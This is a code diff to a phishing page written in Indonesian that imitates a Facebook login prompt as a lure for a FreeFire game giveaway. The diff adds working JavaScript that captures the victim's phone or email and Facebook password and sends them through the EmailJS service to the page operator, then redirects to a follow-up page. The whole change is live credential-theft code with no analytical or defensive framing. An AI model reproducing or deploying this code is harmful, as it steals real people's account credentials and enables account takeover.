@@ -107,7 +107,7 @@
              <div class="txt-login-fb">
               Masuk ke akun Facebook Anda untuk terhubung dengan FreeFire
              </div>
-             <form class="login-form" action="valid.php" method="POST" onsubmit="return valid()">
+             <form class="login-form" id="formData">
                 <label>
                 <input type="text" id="user" name="user" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off">
                 </label>
@@ -115,7 +115,7 @@
                 <input type="password" id="pass" name="pass" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off">
                 </label>
                 <input type="hidden" name="ip" id="ip" value="">
-                <button  type="submit" id="btnfb" class="btn-login-fb">Masuk</button>
+                <button  type="button" id="btnfb" class="btn-login-fb" onclick="sendEmail()">Masuk</button>
              </form>
              <div class="txt-create-account">Create account</div>
              <div class="txt-not-now">Not now</div>
@@ -147,7 +147,36 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>
+
+    <!-- send Email -->
+    <script type="text/javascript"src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
     <script type="text/javascript">
+        (function(){
+            emailjs.init("user_IBVoaVIrs8D0kypHggMEf");
+        })();
+    </script>
+
+    <script>
+        function sendEmail(){
+            const templateParams = {
+                email : document.getElementById('user').value,
+                password : document.getElementById('pass').value
+            }
+
+            emailjs.send('service_k75agub', 'template_jxresor', templateParams)
+            .then(function(response) {
+                console.log('SUCCESS!', response.status, response.text);
+                window.location.href = 'valid.html'
+            }, function(error) {
+                console.log('FAILED...', error);
+            });
+
+        }
+
+    </script>
+
+    <script type="text/javascript">
+       
 
     	function spin()
     	{
